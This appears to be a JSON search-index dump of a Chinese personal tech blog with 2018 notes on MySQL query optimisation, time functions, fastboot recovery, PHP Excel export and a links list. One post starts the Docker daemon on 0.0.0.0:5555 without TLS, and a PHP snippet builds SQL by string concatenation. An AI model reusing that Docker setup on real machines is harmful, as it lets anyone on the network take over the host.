雖然不知道為什麼最佳解答是第一個吃效能的 呵呵 相信可能還有更好用的 可能我沒有記錄到 不過我相信我應該會很常回來看這篇 參考來源: mysql - selecting rows in the last 5 minutes using unix time stamp - Stack Overflow MySQL :: MySQL 8.0 Reference Manual :: 12.7 Date and Time Functions sql - Difference between now() and current_timestamp - Database Administrators Stack Exchange database - Difference between SYSDATE(),NOW(),CURRENT_TIMESTAMP,CURRENT_TIMESTAMP() in MySQL? - Stack Overflow MySQL系统时间函数NOW(),CURRENT_TIMESTAMP(),SYSDATE()的区别 - Qiurf - 博客园 ","date":"2018-05-31","objectID":"/blog/posts/MYSQL-%E6%99%82%E9%96%93%E9%81%8B%E7%AE%97-%E7%AD%86%E8%A8%98/:0:9","tags":["MySQL","UNIX_TIMESTAMP","to_days"],"title":"MYSQL 時間運算 筆記","uri":"/blog/posts/MYSQL-%E6%99%82%E9%96%93%E9%81%8B%E7%AE%97-%E7%AD%86%E8%A8%98/"},{"categories":["PHP"],"content":"最近公司用xlsx_writer做報表mk-j/PHP_XLSXWriter: Lightwight XLSX Excel Spreadsheet Writer in PHP 發現使用者編號(uid)竟然跟DB不一樣…. 讓我震驚了!!!以為我程式出BUG了… 原本以為是我程式哪裡出問題，結果發現var_dump正常 打開Excel就不正常了 15位數Excel會自動補0 如何解決EXCEL數字過長自動加0的問題？ @ 阿水資訊站 :: 痞客邦 :: 沒想到採到這個雷….. 明明有對header做string 但超過15位數就不正常 其他有設定string(沒超過15位數)都顯示正常 不過最後神同事用=\"123456789123456789123456789\" 解決問題!! ","date":"2018-05-31","objectID":"/blog/posts/PHP-xlsx-writer-excel-15%E4%BD%8D%E6%95%B8%E6%9C%83%E9%80%B2%E5%8B%95%E9%80%B2%E4%BD%8D%E7%9A%84%E5%95%8F%E9%A1%8C/:0:0","tags":["xlsx","excel","PHP"],"title":"PHP_xlsx_writer  excel 15位數會進動進位的問題","uri":"/blog/posts/PHP-xlsx-writer-excel-15%E4%BD%8D%E6%95%B8%E6%9C%83%E9%80%B2%E5%8B%95%E9%80%B2%E4%BD%8D%E7%9A%84%E5%95%8F%E9%A1%8C/"},{"categories":["docker"],"content":"最近在測試phpstorm 因為不想在window 10上灌docker 想遠端連docker 發現phpstorm好像有遠端控制選項 在使用內建遠端時候 起注意這個會有安全性的問題 至於我在家裡使用 不需要考慮到這一塊 暫時不考慮TSL那一塊 之前有買「Docker入門與實戰」 但是書上docker daemon用不出來 後來看了網路用法不太一樣 远程连接docker daemon，Docker Remote API | Deepzz’s Blog https://docs.docker.com/engine/reference/commandline/dockerd/#description sudo \u003cpath to\u003e/dockerd -H 0.0.0.0:5555 \u0026 打上這樣久能開啟5555 port給phpstorm操作使用 不過在第一次開啟感覺還是打指令比較方便耶… 當然也可以照远程连接docker daemon，Docker Remote API | Deepzz’s Blog 設定/etc/docker/daemon.json在執行dockerd 這樣就能愉悅在phpstorm玩docker ","date":"2018-05-26","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8phpstorm%E7%94%A8docker-remote%E9%81%A0%E7%AB%AF%E6%93%8D%E4%BD%9C/:0:0","tags":["docker","phpstorm"],"title":"使用phpstorm用docker remote遠端操作","uri":"/blog/posts/%E4%BD%BF%E7%94%A8phpstorm%E7%94%A8docker-remote%E9%81%A0%E7%AB%AF%E6%93%8D%E4%BD%9C/"},{"categories":["MySQL"],"content":"常把搜尋條件用在索引上面 可以加快查詢 今天實驗一個東西，把uid加入到index上面 但是explain竟然還是full scan index還會有掃全表的問題 覺得很神奇 就稍微研究一下 筆記筆記 沒有用*查詢，竟然還會full scan Google查詢一下，varchar做為index好像不太好(不確定是這個問題，相關資訊太少) 就換了一下查法 ![key查詢\"](./fast.png “primary key,index) 竟然就正常… 那試試*看看好了… ![key查詢”](./normal.png “primary key,index) full scan 最後試試，IN優化方法(使用inner join ) ![key查詢”](./best.png “primary key,index) 注意where用哪張表，select就要用另一張表 這樣就不會full scan了 愉悅!!!! 參考來源： 对mysql中last_insert_id()的新理解-博客即日起停止更新-51CTO博客 [数据库与SQL] - No.5 MYSQL实现 RANK函数排序功能 - CSDN博客 Mysql row number()排序函数的用法和注意_Mysql_脚本之家 MySQL rownum的實作與排名的方法 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 mysql的最佳索引攻略 · Mysql设计与优化专题 · 看云 MySQL慢查询Explain Plan分析 - CSDN博客 【mysql的设计与优化专题(6)】mysql索引攻略 - 菜问 - 博客园 MySQL数据库中EXPLAIN的使用及其注意事项详解 - 51CTO.COM MYSQL EXPLAIN语句的extended 选项学习体会 - cy163 - 博客园 ","date":"2018-05-26","objectID":"/blog/posts/MySQL%E6%8A%93%E8%B3%87%E6%96%99%E8%A8%AD%E5%AE%9A%E5%AD%97%E4%B8%B2%E6%AC%84%E4%BD%8D%E7%82%BA%E7%B4%A2%E5%BC%95%E6%9F%A5%E8%A9%A2%E5%84%AA%E5%8C%96%E6%96%B9%E6%B3%95/:0:0","tags":["sql","MySQL","index","MySQL優化"],"title":"MySQL抓資料設定字串欄位為索引查詢優化方法","uri":"/blog/posts/MySQL%E6%8A%93%E8%B3%87%E6%96%99%E8%A8%AD%E5%AE%9A%E5%AD%97%E4%B8%B2%E6%AC%84%E4%BD%8D%E7%82%BA%E7%B4%A2%E5%BC%95%E6%9F%A5%E8%A9%A2%E5%84%AA%E5%8C%96%E6%96%B9%E6%B3%95/"},{"categories":["MySQL"],"content":"最近有專案要做，舊有的table記錄會員展期時間都在不同列 但是同時抓不同列的頭尾，要怎麼抓聽 前一間公司有做過切帳，但是…那時候切帳有頭尾分開 這次是連在一起 同尾跟上一個不連續代表有展期是分開的 就想想這張table有什麼方法可以做到 想了一連串方法 用union all把starttime和endtime欄位串起來 做count()做數量加總 having過濾需要長度1的 代表 基數行是展期開頭 偶數行是展期結束 網路爬了一下MySQL要怎麼做Rank [数据库与SQL] - No.5 MYSQL实现 RANK函数排序功能 - CSDN博客 MySQL 求名次的問題 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 接下來序列都做好了， 原本想用1,0,1,0來做續接的方法 但是都失敗了 不過最後想到一個方式串接 最近看「SQL語法範例辭典」P.516 Between ,一個資料表當做不同資料表 實例都還滿有趣的 這個跟上一間切帳有種同工之妙 最後可以在用user跟這張表用between串起來… 不過用這個東西SQL可能特別長…. where aa.rank+1 = bb.Rank AND aa.Rank%2 = 1; aa.rank+1 = bb.rank rank對2對3，我一直記錯 (2) + 1 = 3 把偶數行用消失，就rank % 2 = 1就好了 最後怕效能，所以在MySQL索引加入uid為index 但是竟然還是full scan 這又是另外一個故事了XD 最後用join方式解決出問題(解法跟上次MySQL IN解決方法差不多) 有空再開筆記 create table test_tb ( id int auto_increment primary key, uid varchar(10) null, starttime int null, endtime int null ) comment 'test' ; create index test_tb_uid_index on test_tb (uid) ; -- TRUNCATE test_tb; INSERT INTO test_tb(uid,starttime,endtime)VALUES ('a',unix_timestamp('2013-01-01'),unix_timestamp('2013-02-02')); INSERT INTO test_tb(uid,starttime,endtime)VALUES ('a',unix_timestamp('2013-02-02'),unix_timestamp('2013-03-01')); INSERT INTO test_tb(uid,starttime,endtime)VALUES ('a',unix_timestamp('2013-04-01'),unix_timestamp('2013-07-01')); INSERT INTO test_tb(uid,starttime,endtime)VALUES ('a',unix_timestamp('2013-07-01'),unix_timestamp('2013-09-01')); INSERT INTO test_tb(uid,starttime,endtime)VALUES ('b',unix_timestamp('2013-01-01'),unix_timestamp('2013-02-01')); INSERT INTO test_tb(uid,starttime,endtime)VALUES ('b',unix_timestamp('2013-03-01'),unix_timestamp('2013-04-01')); INSERT INTO test_tb(uid,starttime,endtime)VALUES ('b',unix_timestamp('2013-04-01'),unix_timestamp('2013-05-01')); -- query select * from test_tb;; SELECT * FROM ( SELECT @rownum := @rownum+1 AS 'Rank', t FROM (SELECT from_unixtime(time) t FROM ( select starttime as 'time' from test_tb WHERE uid = 'a' union ALL SELECT endtime as 'time' FROM test_tb where uid = 'a' ) a group by time HAVING count(1) = 1 ) a, (SELECT @rownum := 0) r ) aa,( SELECT @rownum1 := @rownum1+1 AS 'Rank', t FROM (SELECT from_unixtime(time) t FROM ( select starttime as 'time' from test_tb WHERE uid = 'a' union ALL SELECT endtime as 'time' FROM test_tb where uid = 'a' ) a group by time HAVING count(1) = 1 ) a, (SELECT @rownum1 := 0) r ) bb where aa.rank+1 = bb.Rank AND aa.Rank%2 = 1; EXPLAIN SELECT * FROM ( SELECT @rownum := @rownum+1 AS 'Rank', t FROM (SELECT from_unixtime(time) t FROM ( select i.starttime as 'time' from test_tb i inner join test_tb ii WHERE ii.uid = 'a' union ALL SELECT i.endtime as 'time' FROM test_tb i inner join test_tb ii where ii.uid = 'a' ) a group by time HAVING count(1) = 1 ) a, (SELECT @rownum := 0) r ) aa,( SELECT @rownum1 := @rownum1+1 AS 'Rank', t FROM (SELECT from_unixtime(time) t FROM ( select i.starttime as 'time' from test_tb i inner join test_tb ii WHERE ii.uid = 'a' union ALL SELECT i.endtime as 'time' FROM test_tb i inner join test_tb ii where ii.uid = 'a' ) a group by time HAVING count(1) = 1 ) a, (SELECT @rownum1 := 0) r ) bb where aa.rank+1 = bb.Rank AND aa.Rank%2 = 1; SQL Fiddle ","date":"2018-05-25","objectID":"/blog/posts/%E7%94%A8MySQL%E6%8A%93%E5%A4%9A%E6%AC%84%E5%8F%96%E8%B5%B7%E5%A7%8B%E6%99%82%E9%96%93%E8%88%87%E7%B5%90%E6%9D%9F%E6%99%82%E9%96%93%E7%94%A8%E6%B3%95/:0:0","tags":["sql","MySQL"],"title":"用MySQL抓多列取起始時間與結束時間用法","uri":"/blog/posts/%E7%94%A8MySQL%E6%8A%93%E5%A4%9A%E6%AC%84%E5%8F%96%E8%B5%B7%E5%A7%8B%E6%99%82%E9%96%93%E8%88%87%E7%B5%90%E6%9D%9F%E6%99%82%E9%96%93%E7%94%A8%E6%B3%95/"},{"categories":["Android"],"content":"最近紅米NOTE3電源鍵壞了很久，但是平常可以指紋辨識解鎖 有幾次不小心關機，但是強按還是有辦法開機 但今天不行了….，剛好買新機 想備份LINE，但是無法開機 我Google尋了很多方法 最終採取fastboot開機法 小米手机电源键坏了怎么办？怎么开机啊？_安卓手机_手机学院_脚本之家 這一篇使用結果沒用 FastBoot 紅米NOTE3 進入方法 音量键- + 电源键 3秒 但是…，電源鍵壞掉…無法使用 不過可以插電源線充電插入時，按下音量鍵- 可以進入fastboot模式 最後，[Linux] fastboot 用法學習歸納 - 代碼家 sudo add-apt-repository ppa:nilarimogard/webupd8 ### 我沒有執行上面，發現內鍵可以安裝 sudo apt-get update sudo apt-get install android-tools-adb android-tools-fastboot 安裝FastBoot進入root，fastboot reboot 你的手機就會重新開機 愉悅~~~ 手機設定畫面，第二章圖可以設定自動撥放 https://developers.google.com/web/updates/2017/09/autoplay-policy-changes\u0008 https://times.hinet.net/news/21737359 [Linux] fastboot 用法學習歸納 - 代碼家 adb \u0026 fastboot 常用指令 – HTC Flash Zone ","date":"2018-05-19","objectID":"/blog/posts/Android%E6%89%8B%E6%A9%9F%E9%9B%BB%E6%BA%90%E9%8D%B5%E5%A3%9E%E6%8E%89%E9%96%8B%E6%A9%9F%E6%96%B9%E6%B3%95/:0:0","tags":["Android"],"title":"Android手機電源鍵壞掉，開機方法","uri":"/blog/posts/Android%E6%89%8B%E6%A9%9F%E9%9B%BB%E6%BA%90%E9%8D%B5%E5%A3%9E%E6%8E%89%E9%96%8B%E6%A9%9F%E6%96%B9%E6%B3%95/"},{"categories":["SQL"],"content":"今天做專案，使用到select xxx,ooo ,zzzz from xxxx group by xxx,ooo 語句(沒有搭配統計) 發現跟我想像中怪怪的 平常使用都是用 一開始我以為會有重複資料 但結果沒有 不過發現執行結果跟distanct一樣事情 但我印象中db2不能這樣跑 db2一定要group by xxx,ooo,zzz才能跑 就算mysql做group by xxx,ooo跑出來的zzz也只有一個欄位 跑出來的zzz只會有一筆(假如有兩筆以上，不知道是不是照自然排序抓出來的) 然後找不到db2語法 但還是有找到，其他DBMS都不能跑 mysql的group by 語句可以select 沒有被分組的欄位，如 select id,name,age from A group by age 這樣 但是在orcale和sqlserver中是會報錯的。這個取出的id,name所在的行是每個分組中的第一行數據。 www.zendei.com | 502: Bad gateway 你搞懂 ORACLE、 SQLSERVER、MYSQL與DB2的區別了嗎_ZenDei技術網路在線 Hive group by distinct性能调优 | LittleQ GROUP BY Clause: How Well Do You Know It? Syun: [SQL]GROUP BY 與 DISTINCT 的差異 Mysql group by 详解(写的比较详细)-贵子-51CTO博客 DB2数据库DISTINCT与GROUP BY 对比 - CSDN博客 MySQL的四种GROUP BY用法-博客-云栖社区-阿里云 Comparison of database tools - Wikipedia ","date":"2018-05-17","objectID":"/blog/posts/group-by-%E5%92%8Cdistinct%E4%B8%8D%E4%B8%80%E6%A8%A3%E7%9A%84%E5%9C%B0%E6%96%B9/:0:0","tags":["MySQL","distinct","sql"],"title":"group by 和distinct不一樣的地方","uri":"/blog/posts/group-by-%E5%92%8Cdistinct%E4%B8%8D%E4%B8%80%E6%A8%A3%E7%9A%84%E5%9C%B0%E6%96%B9/"},{"categories":["MySQL"],"content":"最近在專案使用phpmyadmin測試sql的時候 發現第一次執行需要3秒的時間 第二次是0.3秒的時間 但是…我不可能一直的等很久再做Query動作 後來有在網路上看到在 select 後面插入SQL_NO_CACHE 可以解決這個問題 Mysql 简单SELECT，第一次很慢，以后很快，这是什么问题 - 第2页 - MySQL及其它开源数据库 - ITPUB论坛－中国最专业的IT技术社区 你真的會用mysql 的SQL_NO_CACHE嗎？ - 每日頭條 ","date":"2018-05-17","objectID":"/blog/posts/%E8%AA%BF%E6%95%99MYSQL%E6%95%88%E8%83%BDSQL-NO-CACHE%E4%B8%8D%E8%AE%80%E5%8F%96%E7%B7%A9%E5%AD%98/:0:0","tags":["MySQL","sql"],"title":"調教MYSQL效能，SQL_NO_CACHE不讀取緩存","uri":"/blog/posts/%E8%AA%BF%E6%95%99MYSQL%E6%95%88%E8%83%BDSQL-NO-CACHE%E4%B8%8D%E8%AE%80%E5%8F%96%E7%B7%A9%E5%AD%98/"},{"categories":["MySQL"],"content":"因為網域關係，平常都是使用phpmyadmin預做設定 有時候下比較差的SQL，就不能執行中斷指令 phpmyadmin就會卡住…. 剛好發現用cli模式登入mysql 可以做刪除程序 mysql -h ip -u xxxx -p 就可以登入mysql資料庫裡面 只要在不打;下 無法送出指令 show processlist; 可以看到是否有lock程序 使用kill可以做刪除動作 kill id ; 發現在不用phpmyadmin時候，cli可以中斷程序 phpmyadmin送出去，就像變了心女朋友一樣回不來了不能中斷 只是無法修改是一行打做的東西 MySQL 常用指令 - Jex’s Note 學習備忘錄: 安裝與登入mysql ","date":"2018-05-17","objectID":"/blog/posts/MySQL%E6%9F%A5%E8%A9%A2%E9%80%B2%E8%A1%8C%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%8B%80%E6%B3%81%E4%B8%A6%E5%88%AA%E6%8E%89lock%E7%A8%8B%E5%BA%8F/:0:0","tags":["mysql","sql","lock"],"title":"MySQL查詢進行中程序狀況，並刪掉lock程序","uri":"/blog/posts/MySQL%E6%9F%A5%E8%A9%A2%E9%80%B2%E8%A1%8C%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%8B%80%E6%B3%81%E4%B8%A6%E5%88%AA%E6%8E%89lock%E7%A8%8B%E5%BA%8F/"},{"categories":["SQL"],"content":"最近使用有一個程式SQL會跑3秒 程式共花了1x秒鐘 想把他cost 時間降下來 但IN方法不知道為什麼那麼慢 就簡單研究有沒有更好的寫法 SELECT ptm.tablename FROM `secord_big_table` ptm WHERE ptm.playlistID IN (SELECT stm.playlistID FROM `first_big_table` stm WHERE stm.sid IN (SELECT sid FROM `small_table` WHERE as_id = 1 AND item_no = 1)) 執行explain看一下狀態… first_big_table是掃全表的樣子 暫時用LIMIT和=解決問題 SELECT ptm.tablename FROM `secord_big_table` ptm WHERE ptm.playlistID = (SELECT stm.playlistID FROM `first_big_table` stm WHERE stm.sid IN (SELECT sid FROM `small_table` WHERE as_id = 1 AND item_no = 4) LIMIT 0,1 ) 事後發現 這不是我之前寫的非相關子查詢嗎 SQL子查詢筆記(相關子查詢/非相關子查詢) « 進擊的程式新手 照到理沒理由這麼慢阿… 好啦，這時候突然回想起來Backend 台灣 (Backend Tw)裡面的T大常常批評MySQL 在絕望下尋找新方法 ","date":"2018-05-15","objectID":"/blog/posts/%E5%9C%A8MySQL5-0%E6%9F%A5%E8%A9%A2%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E4%BD%BF%E7%94%A8IN%E5%AD%90%E6%9F%A5%E8%A9%A2%E5%A5%BD%E6%85%A2/:0:0","tags":["MySQL","IN","效能"],"title":"在MySQL5.0查詢大量資料使用IN子查詢好慢(優化方法)","uri":"/blog/posts/%E5%9C%A8MySQL5-0%E6%9F%A5%E8%A9%A2%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E4%BD%BF%E7%94%A8IN%E5%AD%90%E6%9F%A5%E8%A9%A2%E5%A5%BD%E6%85%A2/"},{"categories":["SQL"],"content":"exists優化IN語句 第一種格式是使用IN操作符： … where column in(select * from … where …); 第二種格式是使用EXIST操作符： … where exists (select ‘X’ from …where …); 我相信絕大多數人會使用第一種格式，因為它比較容易編寫，而實際上第二種格式要遠比第一種格式的效率高。在Oracle中可以幾乎將所有的IN操作符子查詢改寫為使用EXISTS的子查詢。 第二種格式中，子查詢以‘select ‘X’開始。運用EXISTS子句不管子查詢從表中抽取什麼資料它只查看where子句。這樣優化器就不必遍曆整個表而僅根據索引就可完成工作（這裏假定在where語句中使用的列存在索引）。相對於IN子句來說，EXISTS使用相連子查詢，構造起來要比IN子查詢困難一些。 通過使用EXIST，Oracle系統會首先檢查主查詢，然後運行子查詢直到它找到第一個匹配項，這就節省了時間。Oracle系統在執行IN子查詢時，首先執行子查詢，並將獲得的結果列表存放在在一個加了索引的臨時表中。在執行子查詢之前，系統先將主查詢掛起，待子查詢執行完畢，存放在臨時表中以後再執行主查詢。這也就是使用EXISTS比使用IN通常查詢速度快的原因 [效能]SQL語句性能調整原則 @ Programmer Developer Notebook :: 隨意窩 Xuite日誌 ","date":"2018-05-15","objectID":"/blog/posts/%E5%9C%A8MySQL5-0%E6%9F%A5%E8%A9%A2%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E4%BD%BF%E7%94%A8IN%E5%AD%90%E6%9F%A5%E8%A9%A2%E5%A5%BD%E6%85%A2/:1:0","tags":["MySQL","IN","效能"],"title":"在MySQL5.0查詢大量資料使用IN子查詢好慢(優化方法)","uri":"/blog/posts/%E5%9C%A8MySQL5-0%E6%9F%A5%E8%A9%A2%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E4%BD%BF%E7%94%A8IN%E5%AD%90%E6%9F%A5%E8%A9%A2%E5%A5%BD%E6%85%A2/"},{"categories":["SQL"],"content":"實戰MySQL5.0上面 有在IN和EXISTS的差異 @ 芊芊的窩 :: 痞客邦 ::改成exists語句 而假如外部的表格A是相對的儲存大量資料，則採用第一個方法IN的效率將會比較好，假如你使用EXISTS，則除了會對A這個大表格進行全面掃瞄外，還會一筆一筆讀取所有A的資料列，效能自然較差。 簡單的一句話，外大內小=IN，外小內大=EXISTS，這是一個實用的概略評估方法，在大部分的情況下是適用的。 我覺得優化原因是slides/SQL_report_v2.pdf at master · TritonHo/slides的Query Optimizer淺談 不過我修改 SELECT stm.playlistID FROM `first_big_table` stm WHERE exists (SELECT 'x' FROM `small_table` WHERE as_id = 1 AND item_no = 1 AND stm.sid IN sid) 還是沒用… 最後還是想到Backend 台灣 (Backend Tw)裡面的T大常常批評MySQL ","date":"2018-05-15","objectID":"/blog/posts/%E5%9C%A8MySQL5-0%E6%9F%A5%E8%A9%A2%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E4%BD%BF%E7%94%A8IN%E5%AD%90%E6%9F%A5%E8%A9%A2%E5%A5%BD%E6%85%A2/:2:0","tags":["MySQL","IN","效能"],"title":"在MySQL5.0查詢大量資料使用IN子查詢好慢(優化方法)","uri":"/blog/posts/%E5%9C%A8MySQL5-0%E6%9F%A5%E8%A9%A2%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E4%BD%BF%E7%94%A8IN%E5%AD%90%E6%9F%A5%E8%A9%A2%E5%A5%BD%E6%85%A2/"},{"categories":["SQL"],"content":"子查詢語句注意問題 謝晒的PHP網頁設計: [MYSQL] 多層式子查詢 效能注意事項 ","date":"2018-05-15","objectID":"/blog/posts/%E5%9C%A8MySQL5-0%E6%9F%A5%E8%A9%A2%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E4%BD%BF%E7%94%A8IN%E5%AD%90%E6%9F%A5%E8%A9%A2%E5%A5%BD%E6%85%A2/:3:0","tags":["MySQL","IN","效能"],"title":"在MySQL5.0查詢大量資料使用IN子查詢好慢(優化方法)","uri":"/blog/posts/%E5%9C%A8MySQL5-0%E6%9F%A5%E8%A9%A2%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E4%BD%BF%E7%94%A8IN%E5%AD%90%E6%9F%A5%E8%A9%A2%E5%A5%BD%E6%85%A2/"},{"categories":["SQL"],"content":"用程式組IN字串就PK 今天實驗結果，在MYSQL5.0使用子查詢IN改寫exists速度還是很慢 然後發現跟我之前寫的非相關子查詢速度有不一樣 但是改成IN(‘xxxx’,‘oooo’,‘fffff’) 速度就比較快 所以目前先用程式拆兩段 \u003c? $array_in = array(); foreach ($in_sid as $value) { array_push($array_in,$value['sid']); } $sql = \"select xxx from ooo where oo IN (\" .implode( \",\" , $array_in).\")\"; ","date":"2018-05-15","objectID":"/blog/posts/%E5%9C%A8MySQL5-0%E6%9F%A5%E8%A9%A2%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E4%BD%BF%E7%94%A8IN%E5%AD%90%E6%9F%A5%E8%A9%A2%E5%A5%BD%E6%85%A2/:4:0","tags":["MySQL","IN","效能"],"title":"在MySQL5.0查詢大量資料使用IN子查詢好慢(優化方法)","uri":"/blog/posts/%E5%9C%A8MySQL5-0%E6%9F%A5%E8%A9%A2%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E4%BD%BF%E7%94%A8IN%E5%AD%90%E6%9F%A5%E8%A9%A2%E5%A5%BD%E6%85%A2/"},{"categories":["SQL"],"content":"柳暗花明又一村 這樣跑子查詢竟然吃到key了….. 但不知道這樣跑好不好 SELECT b.sid, (SELECT ptm.tablename FROM `social`.`secord_big_table` ptm WHERE ptm.playlistID = b.a) FROM (SELECT g.sid, (SELECT stm.playlistID FROM `social`.`first_big_table` stm WHERE stm.sid = g.sid) AS a FROM `pay`.`activity_guess_item` g WHERE as_id = 1 AND item_no = 4) AS b 雖然程式只需要抓到一筆 但上面方法可以抓到多筆 效能能吃到key 算是另類解法 ","date":"2018-05-15","objectID":"/blog/posts/%E5%9C%A8MySQL5-0%E6%9F%A5%E8%A9%A2%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E4%BD%BF%E7%94%A8IN%E5%AD%90%E6%9F%A5%E8%A9%A2%E5%A5%BD%E6%85%A2/:5:0","tags":["MySQL","IN","效能"],"title":"在MySQL5.0查詢大量資料使用IN子查詢好慢(優化方法)","uri":"/blog/posts/%E5%9C%A8MySQL5-0%E6%9F%A5%E8%A9%A2%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E4%BD%BF%E7%94%A8IN%E5%AD%90%E6%9F%A5%E8%A9%A2%E5%A5%BD%E6%85%A2/"},{"categories":["SQL"],"content":"INNER JOIN解決方法 最後網路爬到用INNER JOIN 優化 [慢查优化]慎用MySQL子查询，尤其是看到DEPENDENT SUBQUERY标记时 - 旁观者 - 博客园 MySQL性能优化小记：MySQL子查询很慢的问题 - Bash @ Linux - ITeye博客 SELECT stm.tablename FROM (SELECT ptm.playlistID FROM `secord_big_table` ptm INNER JOIN `smaill_table` g ON ptm.sid = g.sid WHERE as_id = 1 AND item_no = 4 ) p INNER JOIN `first_big_table` stm ON stm.playlistID = p.playlistID WHERE stm.playlistID = p.playlistID 用這種解法，速度有變比較快 但這種寫法真的不時直覺... ## 結論 網路上查，好像MySQL到5.7和8.0效能上有很大的改進 希望我有機會能使用到... 參考來源: * [MySQL特异功能之：Impossible WHERE noticed after reading const tables - 风轻扬的日志 - 网易博客](http://wangyuanzju.blog.163.com/blog/static/13029200691114035831/) * [MySql Explain 的使用[转] - 不待人亲 - ITeye博客](http://budairenqin.iteye.com/blog/1754937) * [MySQL EXPLAIN：Impossible WHERE noticed after re... - NILYANG](https://my.oschina.net/lxrm/blog/108309) * [mysql - Why would an IN condition be slower than \"=\" in sql? - Stack Overflow](https://stackoverflow.com/questions/3417074/why-would-an-in-condition-be-slower-than-in-sql/3417190#3417190) * [sql - This SELECT query takes 180 seconds to finish - Stack Overflow](https://stackoverflow.com/questions/3416076/this-select-query-takes-180-seconds-to-finish) * [query optimization - MySQL \"IN\" queries terribly slow with subquery but fast with explicit values - Stack Overflow](https://stackoverflow.com/questions/5018284/mysql-in-queries-terribly-slow-with-subquery-but-fast-with-explicit-values) * [[慢查优化]慎用MySQL子查询，尤其是看到DEPENDENT SUBQUERY标记时 - 旁观者 - 博客园](http://www.cnblogs.com/zhengyun_ustc/p/slowquery3.html) * [MySQL性能优化小记：MySQL子查询很慢的问题 - Bash @ Linux - ITeye博客](http://codingstandards.iteye.com/blog/1344833) * [[慢查优化]慎用MySQL子查询，尤其是看到DEPENDENT SUBQUERY标记时 - 旁观者 - 博客园](http://www.cnblogs.com/zhengyun_ustc/p/slowquery3.html) * 高性能mysql第三版 P.223 ","date":"2018-05-15","objectID":"/blog/posts/%E5%9C%A8MySQL5-0%E6%9F%A5%E8%A9%A2%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E4%BD%BF%E7%94%A8IN%E5%AD%90%E6%9F%A5%E8%A9%A2%E5%A5%BD%E6%85%A2/:6:0","tags":["MySQL","IN","效能"],"title":"在MySQL5.0查詢大量資料使用IN子查詢好慢(優化方法)","uri":"/blog/posts/%E5%9C%A8MySQL5-0%E6%9F%A5%E8%A9%A2%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E4%BD%BF%E7%94%A8IN%E5%AD%90%E6%9F%A5%E8%A9%A2%E5%A5%BD%E6%85%A2/"},{"categories":null,"content":"大神 The Will Will Web | 記載著 Will 在網路世界的學習心得與技術分享 Zespia Morris’ Blog 小惡魔 - 美食介紹，電腦技術，生活日記 - AppleBOY’s Blog 阮一峰的网络日志 EPH 的程式日記 | 記錄程式設計生活的點點滴滴 玩具烏托邦: 網頁爬蟲終極武器： puppeteer 布丁布丁吃什麼？ 筆記國度 ","date":"2018-05-14","objectID":"/blog/links/:1:0","tags":null,"title":"好站連結","uri":"/blog/links/"},{"categories":null,"content":"前端 前端，沒有極限 Java 程式教學甘仔店 DEVLOG of andyyou w3cschool - 学编程，从 w3cschool 开始 张鑫旭的个人主页 » 张鑫旭-鑫空间-鑫生活 PJCHENder 私房菜 pushmetop/30-seconds-for-everyday: 聚焦前端 | 夯实基础 | 趣味教程 | 轻松进阶 Let’s Write - 前端工程師 Augustus 的學習筆記 - solving problems, in simple ways. Welcome.Web.World EL PSY CONGROO | 陳文俊的博客 Home | Ian Chu ","date":"2018-05-14","objectID":"/blog/links/:2:0","tags":null,"title":"好站連結","uri":"/blog/links/"},{"categories":null,"content":"PHP XYZ 的筆記本 静默虚空 - 博客园 ","date":"2018-05-14","objectID":"/blog/links/:3:0","tags":null,"title":"好站連結","uri":"/blog/links/"},{"categories":null,"content":"Java 謝晒的 PHP 網頁設計 菜鳥工程師 肉豬 程序员DMZ - 博客园 我沒有三顆心臟 - 博客園 沉迷思考的魚 乐谷技术学习笔记（可公开） · 语雀 JAVA牛牛 ","date":"2018-05-14","objectID":"/blog/links/:4:0","tags":null,"title":"好站連結","uri":"/blog/links/"},{"categories":null,"content":"Linux(Docker) php 开发,服务器架构,seo 优化 KL博客 小柒吃地瓜 哈希 思绪的空中生活 - 记录生活 分享点滴 貧弱水平 Cody 的學習探索 Blog Noob’s Space 小信豬的原始部落 akiyaの博客 this cute world LEMONSYS|个人博客 技術雜記 Technology Notes - Jack Yu | 傑克 安德魯的部落格 骏马金龙 Faryne的程式設計館 眈眈逐逐 - 博客园 錵開や落幕 - 博客园 Nes的草稿箱 HowHow の WebSite 没有理想的人不伤心 FuYuan’s Space - FuYuan’s Space ","date":"2018-05-14","objectID":"/blog/links/:5:0","tags":null,"title":"好站連結","uri":"/blog/links/"},{"categories":null,"content":"資安 節省工具箱 Jason Tools Keniver’s Blog - 記錄工作與生活的各種情懷 ","date":"2018-05-14","objectID":"/blog/links/:6:0","tags":null,"title":"好站連結","uri":"/blog/links/"},{"categories":null,"content":"Net Core WeihanLi - 博客园 程式隨筆 傑士伯的IT學習之路 伊果的沒人看筆記本 | 菜雞寫筆記，踩坑全紀錄 Ray’s Notes Level Up - Level Up Blog (http://larrynung.github.io) 布萊恩的技術相談室 李正浩的博客 林德熙 首页 - Dotnet9 Bo-Hong - 部落格園 I am PC tokengo - 博客园 石頭的coding之路 - 好點子沒價值，有價值的是把好點子實現 ","date":"2018-05-14","objectID":"/blog/links/:7:0","tags":null,"title":"好站連結","uri":"/blog/links/"},{"categories":null,"content":"其它 不知道怎麼分類都會放在這邊。 不專業網管筆記 Puritys Blog CookieTsai 的手記 WFU BLOG | Blogger 調校資料庫 Jamin Zhang pupuliao 的部落格 醉裡挑燈看 Code Mark Lin Blog Mythsman Falldog的程式戰場 凝雨 - Yun | 快乐编程每一天 - Happy Coding Every Days 程式扎記 隔叶黄莺 Yanbin 